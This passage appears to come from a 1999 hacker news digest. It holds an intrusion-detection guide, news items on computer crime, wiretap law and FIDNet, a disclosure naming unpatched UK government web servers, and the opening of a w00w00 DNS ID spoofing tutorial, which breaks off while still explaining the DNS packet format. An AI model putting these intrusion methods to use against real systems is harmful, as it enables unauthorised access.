     systems being protected. Who gets notified, what gets shut down, how long do we have to return to normal operating
     status are all questions to be answered. The key benefit to ID planning is that we are reacting quickly and
     appropriately to an intrusion instead of wasting critical time deciding what to do. A network based denial of service
     attack may require that you immediately disable network services, possibly by unplugging the host from its hub. If
     there has been a local compromise and malicious programs are running on the host, it may need to be shutdown
     immediately. If this is an extremely crucial production host, response plans can get complex, but it still is usually better
     to shut the system down, as you may be racing against a person or program that is two steps ahead of you.
 
     Perform Network based monitoring
 
     One element of intrusion detection is tracking activity on your network segments. Host-based intrusion detection will
     tell you the attacks that reached the host and how successful they are. Network monitoring can alert you to attacks
     occurring through out your network, although it may not give you information about how successful those attacks
     were.
     Look for stations entering or leaving your network segments. Arpwatch is a utility that will track new active MAC
     addresses on your network segment. If you have an SNMP console at your disposal as well as manageable hubs or
     switches, these will also be able to spot new stations coming online on your network.
     Look for network sniffers. Trying to find network sniffers may be a difficult job, as they are listening to traffic, but
     not transmitting anything. Neped is a utility available on Trinux that looks for stations with their NIC set to
     promiscuous mode, a sure sign of a sniffer. This is not a fullproof tool, but it may be able to catch some sniffers,
     particularly those based on an older Linux kernel. Some commercial sniffers have tell tale signatures, they may
     broadcast a licensing packet to look for unauthorized copies of their product.
     Ngrep. This is a nifty utility that you may want to run on a special management station. Ngrep uses libpcap to capture
     all of your network traffic and lets you use pattern matching and filtering expressions like grep to look for specific
     activities, such as all attempts to telnet to your web server. Be aware that modern ethernet switching can make it
     very difficult to see all the traffic on your network. Running ngrep on a shared hub with a specific host, or perhaps
     your ISP router may allow you to capture the traffic you are looking for. Some switches have the capability to "mirror"
     traffic, and send all of the data from one port to another for diagnostics purposes.
 
     Perform Host based scanning
 
     Running the same tools used for the baseline audit on a regularly scheduled basis is a good way to validate system
     integrity and look for subtle break ins. In addition, there are utilities that you may want to run on a real time monitoring
     basis to find problems. Some examples:
     Swatch, the Syslog Watchdog. This is a lightweight Perl program that continuously monitors SYSLOG for security
     issues and can dial a pager to report exceptions.
     Tiger. Written by Texas A&M in response to their own security break-in, this is actually several scripts that can be
     scheduled to check a wide variety of possible vulnerabilities, such as weak permissions, and can also perform cleanup
     of scratch files that may have plain text security information in them.
     Tcp_wrappers is probably the most powerful way to monitor connections to network services on your host in real
     time. Tcp_wrappers can log incoming connections and filter them based upon additional security criteria. Tcp_wrappers
     works by tricking inetd into calling it before invoking a network service, such as your telnet or ftp daemons.
     Tcp_wrappers then logs the connection and either passes the connection on the the appropriate service, such as
     telnetd, or denies the connection altogether. Tcp_wrappers takes an investment in time to get the most out of it, but
     is an exceptional program for providing proactive monitoring and filtering of network connections to your host.
     Building secure systems is not an adequate approach to maintaining long term host security. By developing solid
     intrusion detection plans, performing comprehensive security audits, and scanning both network segments and host
     systems, we will have a much better chance at successful intruder detection.

                                     From...
                                                    


     (IDG) -- Two California communities are being protected by police officers
     with patrol car access to crime databases and records, thanks to a new
     wireless mobile communication and information system. 

     PacketCluster Patrol software, produced by Cerulean Technology Inc.,
     Marlborough, Mass., gives the Salinas/Monterey County Mobile Computer
     Terminal Consortium access to crime-fighting data directly from patrol
     car-based laptop computers. 

     Using the wireless network, more than 400 patrol officers in the consortium
     can access records management systems and county, state and federal
     databases. The officers can access secure information from one or more of
     the databases in a matter of seconds with a single query. 

     "To be able to share records was previously unheard of.... We couldn't do it
     over the radio because of the privileged nature of the information, but now
     officers can do background checks on the system securely, right in their
     cars," said Sgt. Tracy Molfino of the Salinas Police Department. 

     "Before, we didn't have the communication
     between agencies, either in person or
     through a third party," Molfino said. "Now
     we have cross-jurisdictional communication,
     and the whole system is progressing in an
     appropriate fashion." 

     The PacketCluster Patrol system uses
     wireless modems to link the consortium's
     100-plus patrol cars to criminal and motor
     vehicle databases. 

     Officers can communicate with each other
     through the system. It also provides the
     option of cross-referencing previous cases
     and arrests with variables including
     identification information, such as
     birthmarks and scars, and crime patterns in
     certain locations. 

     An unexpected bonus is that officers can run registration checks on a vehicle
     to see if its license plates or registration tags have been reported stolen. With
     the high price of tags in California, that service is being used daily, Molfino
     said. 

     The alliance has four members and will be adding eight more through a
     recently awarded federal grant from the Community Oriented Policing
     Services' Making Officer Redeployment Effective program. With its new
     members, the consortium plans to expand its wireless ability by integrating a
     geographic information system application. 

     "With our soon-to-be 12 members, every geographic area of Monterey
     County will be pulled together into one communications network," Molfino
     said. "The system is only about three-quarters installed, and we're already
     getting 10,000 queries a month."

     By PAULINE LEONG
 
     LUCK and ingenuity enabled a 15-year-old boy to hack
     into two Television Corporation of Singapore (TCS)
     websites on the Internet. 
 
     He made an educated guess at a user name "news" and
     used the same word as the password. He got into the
     TCS server. 
 
     He told another teenager, 18, about it and they both
     logged on several times, disrupting the web pages for
     about 10 hours. 
 
     Yesterday, the younger boy pleaded guilty in the
     Juvenile Court to four charges of unauthorised entry and
     disclosure of password. 
 
     Four other charges will be taken into consideration in his
     sentencing. 
 
     A pre-sentence report will be submitted before the
     judge decides on the punishment. On June 15 this year,
     the Secondary 2 student was watching TV at home
     when he saw an advertisement showing the Internet
     address www.mediacity.com.sg. 
 
     He decided to visit the website and used a software
     function in his computer to connect to the Mediacity
     server. 
 
     After trying various combinations of user names and
     passwords to get into the server, he struck gold with
     "news". He started exploring the directories and files
     there. 
 
     Then he told the 18-year-old whom he had met chatting
     on the Internet that the server had security weaknesses.
     He also told him the access code "news". 
 
     The older boy, an O-level student in a private school,
     logged on, using a "wingate" to mask his identity. This is
     a proxy server used to avoid detection. 
 
     On his advice, the younger boy also used a wingate. 
 
     The older boy told him to look for more access codes,
     in case the system administrator disabled their "news"
     account. 
 
     The boy found a file called "passwd" which contained all
     the authorised user names and their corresponding
     encrypted passwords. 
 
     He then told the older boy the new user names and
     passwords, "informix" in particular, and they both used
     them. 
 
     The younger boy was arrested seven days later at his
     home in Clementi. The 18-year-old has been charged. 
 
     Defence lawyer David Nayar said in mitigation that the
     15-year-old was curious and merely guessed at the
     access code "news". 
 
     According to the lawyer, the boy did not alter any
     documents or files, but in his excitement, revealed the
     access code to another person. 
 
     He added that the boy has since regretted his actions. 
 
     A first offender, the 15-year-old is the younger of two
     boys in his family. His father is a product engineer and
     his mother, a housewife. 

    They have already banned him from using the Internet.

     NEWSBYTES 
 
     Lawmakers in Japan's upper house of parliament
     approved yesterday a controversial bill that gives police
     the power to intercept communications such as
     telephone calls and Internet e-mail as part of their
     investigations into organised crime. 
 
     Having already cleared the lower house, the vote was
     the final hurdle to the bill becoming law.
 
     Japan had been the only G8 nation which did not use
     wiretapping in the course of criminal investigations.
 
     Lawmakers approved a package of three Bills designed
     to help police fight organised crime but it was the
     communications interception bill that prompted the most
     debate and argument.
 
     The Bill is designed to help police battle organised crime
     and as such restricts the interception of communications
     to cases involving illegal drugs, weapons, organised
     group illegal entry into Japan, and organised murders.
 
     Campaigners against the bill have a number of fears.
     Chief among these is that it infringes on an individuals
     right to privacy. They also worry that police may use
     information intercepted that is unrelated to the crime
     under investigation and safeguards on the restriction of
     use to certain types of crime will prove ineffective.
 
     But the government supports the Bill saying it will help
     the police greatly in the battle against organised crime
     and groups like the Aum Shinrikyo religious cult that
     released Sarin nerve gas on the Tokyo subway in 1995.

     Game Makers Take Aim at Pirates
     by Leander Kahney 
     
     12:45 p.m.  16.Aug.99.PDT
     Game companies have filed federal racketeering suit against a nationwide ring of software 
     pirates who methodically distributed top games, sometimes even before they were commercially 
     available. 
     
     The Interactive Digital Software Association has banded together with six major game 
     publishers to file suit against three alleged pirate rings, known as Class, Paradigm, and Razor 1911. 
     
     
     "These are the most sophisticated hacker groups we've run across," said Doug Lowenstein, president 
     of the IDSA, a games industry trade group that helps investigate piracy. "They have tentacles that 
     stretch across the world." 
     
     According to Lowenstein, the three hacker groups involve hundreds of people worldwide and are capable
     of churning out pirated software on an industrial scale. The suit recently filed in U.S. District Court
     in San Francisco names dozens of individuals from across the United States. 
     
     At their height, the three groups turned out pirated copies of 100 of the most popular games every week,
     Lowenstein said, costing the industry millions of dollars in lost revenues. 
     
     The groups are extremely well organized, capable of getting their hands on pre-production copies of 
     popular games, cracking them, and copying them to CD in a matter of days, Lowenstein said. 
     
     "These groups were responsible for a significant amount of games piracy," he said. "[This suit] won't be
     the end of games piracy but it's a significant action in a long war." 
     
     The six publishers -- LucasArts Entertainment, Acclaim Entertainment, The 3DO Company, Infogrames, 
     Bethesda Softworks and Interplay Entertainment, joined the IDSA to file a wide range of charges, the most
     serious of which include copyright and trademark piracy, counterfeiting, and racketeering. 
     
     According to the suit, the defendants operated out of San Francisco; Dallas; Minneapolis; Philadelphia; 
     Los Angeles; Buffalo, New York; Austin, Texas; and Champaign, Illinois. 
     
     Lowenstein declined to name defendants but said they had a significant number of associates overseas, 
     possibly hundreds. 
     
     The ISDA estimates worldwide piracy cost the U.S. games industry $3.2 billion in 1998.

      can safely "blow the whistle" on weaknesses in the UK's
      national Internet and Telecomms infrastructure, 24 hours
      a day, 365 days a year. 

      These weaknesses will eventually be exploited by
      criminals, terrorists and other enemies of the UK,
      damaging our reputation for excellence in information
      technology, and tarnishing the trustworthiness of the UK
      brand name in the era of e-commerce. 

      Both the Royal Mail 

      htpp://www.royalmail.co.uk 
      (and the alias http://www.viacode.co.uk)

      as well as the Scottish Executive (formerly the Scottish
      Office) 

      http://www.scotland.gov.uk 

      have all or part of their websites hosted on Microsoft IIS4
      web servers, which have not had at least a year's worth
      of freely available security patches applied to them. This
      implies unacceptable failures in management procedures
      under the Data Protection Act. 

      Consequently, it was possible for attackers, from
      anywhere on the Internet, to compromise these systems
      in a number of way e.g. 

      1) Denial of Service attacks (both Post Office and
      Scottish Executive) 

      2) Compromise of confidential e-commerce information,
      including names, addresses and credit card details of the
      Post Office on-line stamps & envelopes customers 

      3) Compromise of confidential telegrams from friends and
      families of our military forces in the Balkans sent to
      BFPO-Kosovo (Post Office) 

      4) Damage to the trustworthiness of the ViaCode digital
      certification authority brand name (Post Office). 

      Would you buy Digital Certificates or encryption services
      from a ViaCode which, since its launch is March, cannot
      seem to get its own webserver and instead uses the Royal
      Mail server with a rival South African Thawte digital
      certificate, rather than a ViaCode one ? 

      5) Issuance of fake Press releases from the official
      Scottish Executive website resulting in political
      embarrassment (re- shuffle the Scottish Cabinet ? )
      and/or stock market manipulation ("leak" of Scottish
      Budget details ?) 

      6) Installation of Trojan horse remote control software
      such as netbus, to take complete control of these
      webservers, possibly using them as a springboard for
      further InfoWar attacks on the UK internet infrastructure
      and other back office or internal systems within the Royal
      Mail or the Scottish Executive. 

      Both the web sites were warned about the planned DNS
      Conference announcement, with 48 hours warning by
      email to their webmasters, followed up by special delivery
      "snail mail" to their top management. 

      To date, only the Royal Mail has responded by fixing the
      blatant security holes, and publishing a Security
      Statement on their website 

      http://www.royalmail.co.uk/ISS.htm 

      The "process and technology to secure such systems and
      data" have obviously failed. Serbian hackers, for example,
      are unlikely to be deterred by threats of civil proceedings. 

      The senior management of the Royal Mail seems to think
      that 

      "Microsoft patches have been applied to the website over
      the last year although some have been omitted where
      they are not required for our configuration." 

      Last Thursday 12th August is technically "over the last
      year" but the wwww.royalmail.co.uk systems have been
      vulnerable for months, so perhaps the senior management
      are not getting the full picture from their subordinates. 

      "An external organisation has been contracted to test
      security on our website ("penetration testing")." 

      Presumably this external organisation has only just been
      hired, as it is inconceivable that a reputable one would
      have missed the vulnerabilities mentioned above. 

      The Scottish Executive seems to have ignored both the
      email and "snail mail" warnings, and their website still
      remains vulnerable. 

      We strongly suggest that any news reports or press
      releases published on the Sottish Executive website
      should be independently verified via email, fax or phone. 

      We thank you for your attention

31.0 Mitnick Prosecutor Moving to Private Practice 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     From HNN http://www.hackernews.com/

      contributed by Ted 
      After successfully prosecuting Kevin Poulsen, Ron
      Austin, Justin Petersen, Lewis DePayne and Kevin
      Mitnick, the federal prosecutor David Schindler will be
      moving on to private practice. While none of his cyber
      crime cases actually went to trail he did manage to get
      guilty pleas from all of them.

     Online Crime Fighter Signs Off 
     David Schindler Is Leaving U.S. Attorney's Office for Private Practice. 
     By GREG MILLER, Times Staff Writer  

          Kevin Mitnick wasn't the only prominent figure in the computer
          hacking world closing out a major phase of his career last week.
     David Schindler, one of Mitnick's prosecutors, was also making
     something of a curtain call.
          Mitnick was sentenced to 46 months in prison and ordered to pay
     $4,125 to the companies he victimized. After the hearing, Schindler said
     he is leaving the U.S. attorney's office after a 10-year stint during which he
     won convictions of a list of defendants that reads like a hacking hall of fame.

          Besides Mitnick, Schindler also prosecuted Kevin Poulsen, Ron Austin,
     Justin Petersen and Lewis DePayne--more hackers than any other federal prosecutor
     has faced.
          Along the way, Schindler played a leading role in a number of major
     white-collar crime cases, most notably winning a conviction of former
     Arizona Gov. Fife Symington on bank fraud charges in 1997.
          "I've had just a fabulous run in this office," Schindler said. "I've been
     fortunate to have the greatest mix of cases I could ever have imagined."
          Nevertheless, Schindler is leaving in October for a position as a
     partner in the law firm Latham & Watkins, where he will be part of the
     firm's vast intellectual property team and where his salary will easily exceed the
     $115,000 a year he earned as a federal prosecutor.
          
          During his years as an assistant U.S.attorney in Los Angeles, Schindler built a
     reputation as an unflappable litigator--circumspect, forthright and
     respected by even his adversaries. 
     
     "He is an exceptionally talented prosecutor," said Richard Sherman, who
     represented DePayne and, for a short while, Mitnick. "In the Symington case,
     he was fighting a well-financed political giant, and he acquitted himself
     admirably."
     
          There was a recent setback in the  Symington case. A federal appeals court
     overturned the conviction, ruling that the judge in the case improperly dismissed
     one of the jurors. Schindler said the government has asked the appeals court
     to reconsider.
     
          At 37, Schindler is about the same age as the hackers he prosecuted, and
     though he may not relish the thought, he has a few things in common with them.
     Like most, he is a native Southern Californian, unusually disciplined in his
     craft and with a head for the complexities of computer crime.
          
          But unlike many hackers, Schindler was never particularly interested in
     technology, was fairly popular in school and came from a stable family. His
     father, now deceased, was a courtroom translator. His mother is an executive
     with a music publishing company.
     
          Schindler earned a degree in psychology from UC Berkeley, a law
     degree at UCLA and joined the U.S. attorney's office in 1989. Over the
     course of the next few years, Southern California became a hotbed of hacking
     crimes, and Schindler handled the high-profile cases.
     
          None of the cases ever went to trial.But he extracted guilty pleas from
     Poulsen and Austin, who had rigged radio station call-in contests to win a pair
     of Porsches; Petersen, who once illegally wired $150,000 from a bank; Mitnick,
     who swiped source code from giant
     
     technology companies; and DePayne, Mitnick's longtime accomplice.
          With those cases behind him now, Schindler offered his thoughts on
     those defendants.
          Poulsen "really generates the most complicated feelings for me,"
     Schindler said. "He was probably the brightest, and he had the ability to
     create more harm. But I'm proud of him and the way he's turned his life
     around."
     
          After serving his five-year sentence, Poulsen has established a
     budding career in journalism, writing stories for Wired magazine and
     columns for ZDNet.com.
     
          Austin was "an unfortunate follower," Schindler said. "I don't think
     I've ever seen anybody as frightened as he was when he was arrested. It
     was clear he was not cut out for a life of crime." Austin now works at a
     computer store in West Los Angeles.
     
          Petersen, a flamboyant hacker known for schmoozing minor
     celebrities and porn stars, was behind some of Schindler's more
     embarrassing moments. Petersen engaged in illegal hacking even while
     working as a government informant. When Schindler confronted
     Petersen about this at the federal courthouse, Petersen ducked out of
     their meeting, ran down the courthouse steps and became a fugitive.
     
          "What a piece of work," Schindler said. "I don't think I've ever met a
     person in my life who has had so many aborted attempts at walking the
     straight and narrow, someone whose own arrogance has caused him to
     self-destruct so many times."
     
          For his part, Petersen's occasional comments about Schindler are
     mostly unprintable. Petersen was recently released after a probation
     violation, and is now reportedly trying to start an Internet porn company.
     
          Schindler seems to have the most contempt for Mitnick. He is a
     "strange, in some senses pathetic, misguided human being," Schindler
     said. "I don't hold a lot of confidence that he will turn his life around."
     
          Of course, Mitnick would probably not be complimentary toward
     Schindler either. The notoriously obsessive hacker, who is still in jail, has
     long believed that he has been treated unfairly, and has even accused the
     government of tampering with witnesses, a charge Schindler vehemently
     denies.
     
          Surprisingly, other hackers have a fairly charitable view of Schindler,
     who is married and has a 1-year-old daughter.
          "He was a very tough prosecutor," Austin said. "But looking at it in
     retrospect, I think he was fair. When you compare him to everybody
     else out there, he's head and shoulders above the rest."
     
          Poulsen too holds Schindler in relatively high regard. In contrast to
     other prosecutors, Schindler "charged [me] with crimes I actually
     committed," Poulsen said. "It was refreshing. I'm not crazy about
     prosecutors, but what more can you ask for?"
     
          In his new job, Schindler will be handling trade secret thefts and
     other work involving large companies. But he admits he may also be
     called upon to do criminal work, meaning he could be defending the
     kinds of people he once prosecuted.
     
          "Could I be defending a Mitnick?" he asked, anticipating the
     direction of the interview. "I won't be in that position. Most hackers
     aren't able to afford private practice [defense attorneys]."

32.0 NIPC Head Talks About FidNet 
     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
     
     From HNN http://www.hackernews.com/

      contributed by Weld Pond 
      Richard Clarke, the National Coordinator for Security,
      Infrastructure Protection and Counterterrorism, says
      that the recent hysteria over the proposed FIDNet is
      unwarranted. The proposal calls for the GSA to control
      the IDS network and not the FBI as previously thought.
      He said that once lawmakers actually read the proposal
      and understand how it works opposition will fade away.

      Author of Computer Surveillance Plan
      Tries to Ease Fears

      By TIM WEINER

             ASHINGTON -- Congress has blocked money for a planned
             system to safeguard government computers, a prominent
      Republican has denounced the system as "Orwellian" and some civil
      libertarians are calling it a potential threat. 

      But the plan's author, a senior National Security Council official, says
      those are only temporary setbacks to a critically needed system that will
      be built if President Clinton wants it. 

      The proposed system, called Fidnet, is intended to protect government
      computers from hackers, whether they be precocious teen-agers or
      potential terrorists, administration officials say. It represents "the first
      attempt by any nation to develop a plan to defend its cyberspace," a draft
      plan by the security council says. The White House is seeking $1.5 billion
      in new spending for the program. 

      Although Fidnet has been in the works for more
      than a year, many in Congress learned about it
      on July 28, when The New York Times
      published details of the draft proposal. 

      The reaction was swift. Two days later, the
      House Appropriations Committee deleted $2 million in start-up money
      requested by the FBI to develop the system. 

      Then the House majority leader, Rep. Dick Armey, R-Texas, denounced
      Fidnet, saying it raised "the Orwellian possibility that unscrupulous
      government bureaucrats could one day use such a system to read our
      personal e-mail." 

      But the principal author of the plan, Richard Clarke, the National
      Security Council's counterterrorism czar, said Congress would assuredly
      finance the system once lawmakers understood it and Clinton gave it the
      go-ahead. 

      "If the president approves Fidnet, there'll be funding for it," he said in an
      interview. 

      Clarke, whose formal title is National Coordinator for Security,
      Infrastructure Protection and Counterterrorism, has been warning for
      years about the threat of an "electronic Pearl Harbor" in the form of an
      attack on government computers. He said that a cyberspace assault
      would be "as bad as being attacked by bombs," and that "an attack on
      American cyberspace is an attack on the United States" that should
      trigger a military response. 

      These fears led last year to a new initiative,
      called Presidential Decision Directive 63. Fidnet
      is one of the first major computer-security
      programs to grow out of the directive. It would
      cover civilian agencies, like the State
      Department and the IRS, and would be modeled on and linked to an
      existing Pentagon security system. Ultimately, the plan calls for private
      companies to create security links to the government's systems. 

      Clarke acknowledged that no one in Congress had been briefed on
      Fidnet, which has not yet been given a go-ahead by President Clinton,
      and that the draft plan had raised questions among civil libertarians who
      say it has a potential power to monitor innocent citizens. But he said
      Congress and the system's critics had the wrong idea about the planned
      surveillance network. 

      The critics among the civil libertarians question the FBI's role in the
      computer monitoring scheme. The bureau already has a centralized
      security operation called the National Infrastructure Protection Center,
      based in its headquarters, that has received technical support from the
      National Security Agency, the intelligence service that eavesdrops on the
      rest of the world, and from the CIA. 

      The New York Times reported that the Fidnet system, too, would be
      overseen by the FBI. Clarke's draft plan calls for the National
      Infrastructure Protection Center to play a role in analyzing and
      responding to any signs of intrusion. But Clarke said in the interview that
      while some funds requested for Fidnet were earmarked for the Justice
      Department and the bureau, the system "would not be run by the FBI." 

      Instead, he said, it would be established by the General Services
      Administration, an independent agency better known for furnishing
      government offices than for law enforcement. "It would not be monitoring
      privately owned and operated systems, only government computers,"
      Clarke said. "And it would not violate people's privacy rights." 

      He conceded that failing to brief Congress was a mistake. 

      Because Congress already has a system to detect unauthorized intrusions
      into its information systems, it should realize that "all that Fidnet would be
      would be the same kind of thing for sensitive government computers,"
      Clarke said. 

      "Congress has concerns about Justice being the funding source to pay for
      intrusion detection mechanisms," he said. "That's a legitimate concern.
      When they get the briefing they'll see there's a requirement to have
      something like Fidnet."

33.0 Spoofing revisited (w00w00)

                                DNS ID Hacking                    
                                --------------
     
                              Brought to you by: 
                  Raw-Powa and w00w00 Security Development (WSD)
     
     
     --[1]-- DNS ID Hacking Presentation
     
     w00w00!
     Hi. You might be wondering what DNS ID Hacking (or Spoofing) is.
     DNS ID Hacking isn't the usual way of hacking/spoofing (such jizz
     or any-erect). This method is based on a vulnerability on DNS Protocol.
     This affects several DNS implementations (including WinNT's DNS and BIND,
     for example).
     
     --[1.1]-- DNS Protocol Mechanism
     
     For the first step, you will need to know how the DNS works. We will only
     explain the most important parts of this protocol. In order to do that, we
     will follow the steps of a DNS request packet from A to Z!
     
     1: The client (bla.bibi.com) sends a request of resolution from the domain
     "www.heike.com". To resolve the name, bla.bibi.com uses "ns.bibi.com" for
     DNS. Let's take a look at the following diagram:
     
     /----------------------------------\
     | 111.1.2.123  =  bla.bibi.com     |
     | 111.1.2.222  =  ns.bibi.com      |
     | format:                          |
     | IP_ADDR:PORT->IP_ADDR:PORT       |
     | ex:                              |
     | 111.1.2.123:2999->111.1.2.222:53 |
     \----------------------------------/
     ...
       gethostbyname("www.heike.com");
     ...
     
     [bla.bibi.com]                               [ns.bibi.com] 
     111.1.2.123:1999 --->[?www.heike.com]------> 111.1.2.222:53
     
     Here we see our resolution name request from source port 1999, requesting
     the resolution from the DNS on port 53.
     
     [note: The DNS is always on port 53]
     
     Now that ns.bibi.com has received the resolution request from bla.bibi.com,
     ns.bibi.com will have to resolve the name, let's look at it...
     
     [ns.bibi.com]                                   [ns.internic.net]
     111.1.2.222:53 -------->[dns?www.heike.com]----> 198.41.0.4:53
     
     ns.bibi.com asks ns.internic.net, which is the root name server, for the
     address of www.heike.com, and if it doesn't have it and sends the request
     to a name server which has authority over '.com' domains.
     
     >>> it can have the NS record for heike.com, and not the A/CNAME for
     >>> www.heike.com (this is the normal case). Also, you're not asking
     >>> ns.internic.net, you're asking one of the root servers for 
     >>> COM directly. 
     
     [note: We ask to internic because it could have this request in its cache]
     
     [ns.internic.net]                                       [ns.bibi.com]
     198.41.0.4:53 ------>[ns for.com is 144.44.44.4]------> 111.1.2.222:53
     
     Here we can see that ns.internic.net answered to ns.bibi.com (which is the
     NS that has authority over the domain bibi.com) with the name server
     of for.com (which is the authority over '.com' domains), which has the
     IP address 144.44.44.4 [let's call it ns.for.com]. Now our ns.bibi.com
     will ask ns.for.com for the address of www.heike.com, but this one
     doesn't have it, so it will forward the request to the DNS of heike.com
     which has authority over heike.com as shown here:
     
     [ns.bibi.com]                                [ns.for.com]
     111.1.2.222:53 ------>[?www.heike.com]-----> 144.44.44.4:53
     
     The answer from ns.for.com is:
     
     [ns.for.com]                                              [ns.bibi.com]
     144.44.44.4:53 ------>[ns for heike.com is 31.33.7.4]---> 144.44.44.4:53
     
     Now that we know which IP address has authority on the domain "heike.com"
     [we'll call it ns.heike.com], we ask it what the IP address of the machine
     www (www.heike.com) is:
     
     [ns.bibi.com]                              [ns.heike.com]
     111.1.2.222:53 ----->[?www.heike.com]----> 31.33.7.4:53
     
     And now at least, we have our answer:
     
     [ns.heike.com]                                           [ns.bibi.com]
     31.33.7.4:53 ------->[www.heike.com == 31.33.7.44] ----> 111.1.2.222:53
     
     We can now forward it to our client bla.bibi.com:
     
     [ns.bibi.com]                                             [bla.bibi.com]
     111.1.2.222:53 ------->[www.heike.com == 31.33.7.44]----> 111.1.2.123:1999
     
     Now bla.bibi.com knows the IP address of www.heike.com :)
     
     So.. now let's imagine the opposite; that we'd like to have the name of a
     machine from its IP address. In order to do that, the way to proceed will
     be a little different because the IP address will have to be transformed:
     
     Example: 
     100.20.40.3 will become 3.40.20.100.in-addr.arpa
     
     Attention!! This method is only for the IP resolution request (reverse DNS)
     
     So let's look at practical example when we take the IP of www.heike.com
     (31.33.7.44 or "44.7.33.31.in-addr.arpa" after the translation into a
     comprehensible format for the DNS).
     
     ...
        gethostbyaddr("31.33.7.44");
     ...
     
     
     We send our request to ns.bibi.com (our name server):
     
     [bla.bibi.com]                                          [ns.bibi.com]
     111.1.2.123:2600 ----->[?44.7.33.31.in-addr.arpa]-----> 111.1.2.222:53
     
     ns.bibi.com sends the request for the name of machine that is
     44.7.33.31.in-addr.arpa to ns.internic.net:
     
     [ns.bibi.com]                                          [ns.internic.net]
     111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 198.41.0.4:53 
     
     ns.internic.net will send the IP address of a name server which has
     authority on '31.in-addr.arpa':
     
     [ns.internic.net]                                            [ns.bibi.com]
     198.41.0.4:53 --> [NS for 31.in-addr.arpa is 144.44.44.4] -> 111.1.2.222:53
     
     Now ns.bibi.com will ask the same question to the DNS at 144.44.44.4:
     
     [ns.bibi.com]                                          [ns.for.com]
     111.1.2.222:53 ----->[?44.7.33.31.in-addr.arpa]------> 144.44.44.4:53
     
     And so on...
     In fact the mechanism is almost identical to the one used for name
     resolution.
     
     I hope you understood the dialog on how DNS works. Now let's study DNS
     messages format.
     
     --[1.2]-- DNS packet 
     
     Here is the format of a DNS message :
         +---------------------------+---------------------------+

         +-------------------------------------------------------+
     
     --[1.3]--  Structure of DNS packets.
     
     __ID__
     The ID is to identify each DNS packet, since exchanges between name
     servers are from port 53 to port 53, and it receive more than one
     
     >>> not necessarilly; DNS is allowed to bind any client port, and the
     >>> DNS ID is also needed for asynchronous client resolvers (which
     >>> might need to make more than one simultaneous query)
     
     request at a time, so the ID is the only way to recognize the different DNS
     requests. We'll talk about it a little more later..
     
     __flags__
     The flags area is divided into several parts:
     
            4 bits                    3 bits (always 0)
            |                         |
            |                         |
     [QR | opcode | AA| TC| RD| RA | zero | rcode ]
                                              |
      |           |__|__|__|                  |______ 4 bits
      |                    |_ 1 bit
      |
     1 bit
     
     QR     = If the QR bit is 0, it means that the packet is a question,
              otherwise it's an answer.
     
     opcode = If the value is 0 for a normal request, 1 for a reserve request,
              and 2 for a status request (we don't need to know all these modes).
     
     AA     = If it is equal to 1, it says that the name server has an
              authoritative answer.
     
     TC     = This is unimportant.
     
     RD     = If this flag is to 1, it means "Recursion Request", for example
              when bla.bibi.com asks ns.bibi.com to resolve the name, the flag
              tells the DNS to assume this request.
     
     RA     = If this is set to 1, it means that recursion is available.
              This bit is set to 1 in the answer of the name server if it
              supports recursion.
     
     Zero   = Here are three zeroes...
     
     rcode  = It contains the error messages returned from DNS requests.
              If 0, it means "no error", 3 means "name error"
     
     The 2 following flags don't have any importance to us.
     
     DNS QUESTION:
     
     Here is the format of a DNS question :
     
     +-----------------------------------------------------------------------+
     |                        name of the question                           |
     +-----------------------------------------------------------------------+
     |       type of question         |      type of query                   |
     +--------------------------------+--------------------------------------+
     
     The structure of the question is like this.
     
     Example:
     www.heike.com is [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0] 
     This is always the same for an IP address.
     
     This splits www.heike.com into three parts: "www", "heike", and "com". The
     number in front of each part specifies the length. It is also terminated
     by 0.
     
     44.33.88.123.in-addr.arpa would be:
     [2|4|4|2|3|3|2|8|8|3|1|2|3|7|i|n|-|a|d|d|r|4|a|r|p|a|0]
     [note]: a compression format exists, but we won't use it.
     
     
     type of question:
     
      Here are the values that we will use most of the time:
      [note]: There are more than 20 types of different values(!) and I'm fed
              up with writing :))
     
       name    value
        A    |   1    | IP Address          (for resolving a name to an IP)
        PTR  |   12   | Pointer             (for resolving an IP to a name)
     
     
     type of query:
     
      The values are the same as the type of question's values (I'm not sure
     it's true, but you should look through RFCs 1033-1035 and 1037).
     
     
     
     DNS ANSWER:
     
     The answers have a format that we call RR.
     
     Here is the format of an answer (an RR):
     
     +------------------------------------------------------------------------+
     |      name of the domain                                                |
     +------------------------------------------------------------------------+
     |   type                           |    class                            |
     +----------------------------------+-------------------------------------+
     |                           TTL (time to live)                           |
     +------------------------------------------------------------------------+
     | resource data length       |                                           |
     |----------------------------+                                           |
     |                       resource data                                    |
     +-------------------------------------------------------------------------
     
     name of the domain:
     
     The domain name is stored in the same way that the question for the
     resolution request of www.heike.com. The flag "name of the domain" will
     contain: [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0].
     
     type:
     
     The type flag is the same than "type of query" in the question part of the
     packet.
     
     class:
     The class flag is equal to 1 for Internet data.
     
     time to live:
     This flag explains in seconds the time-life of the informations into the
     name server cache.
     
     resource data length: 
     The length of resource data, for example if resource data length is 4, it
     means that the data in resources data are 4 bytes long.
     
     resource data:  
     here we put the IP for example (at least in our case)
     
     As an example, this is what occurs when ns.bibi.com asks ns.heike.com for 
     www.heike.com's address:
     
     ns.bibi.com:53 ---> [?www.heike.com] ----> ns.heike.com:53 
     
     +---------------------------------+--------------------------------------+
     |   ID = 1999                     | QR = 0 opcode = 0 RD = 1             |
     +---------------------------------+--------------------------------------+
     | numbers of questions = htons(1) | numbers of answers = 0               |
     +---------------------------------+--------------------------------------+
     | number of RR authoritative = 0  | number of supplementary RR = 0       |
     +---------------------------------+--------------------------------------+
      &lt;the question part>                                                     
     +------------------------------------------------------------------------+
     |   name of the question = [3|w|w|w|5|h|e|i|k|e|3|c|o|m|0]               |

     |  type of question = htons(1)    |      type of query=htons(1)          |
     +---------------------------------+--------------------------------------+
     
     Now let's look at the answer from ns.heike.com:
     
     ns.heike.com:53 -->[IP of www.heike.com is 31.33.7.44] --> ns.bibi.com:53
     
     +---------------------------------+---------------------------------------+
     |   ID = 1999                     | QR=1 opcode=0 RD=1  AA =1  RA=1       |
     +---------------------------------+---------------------------------------+
     | numbers of questions = htons(1) | numbers of answers = htons(1)         |
     +---------------------------------+---------------------------------------+
